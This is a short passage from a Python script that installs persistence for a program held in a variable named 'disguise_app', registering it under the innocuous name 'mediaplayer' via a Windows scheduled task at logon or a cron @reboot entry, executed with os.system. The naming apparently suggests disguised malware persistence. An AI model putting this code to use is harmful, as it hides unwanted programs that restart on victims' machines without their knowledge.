        service_command = f'schtasks /create /tn {service_name} /tr "{disguise_app}" /sc onlogon'
    else:
        service_name = "mediaplayer"
        service_command = f'echo "@reboot {disguise_app}" | crontab -'
    
    os.system(service_command)
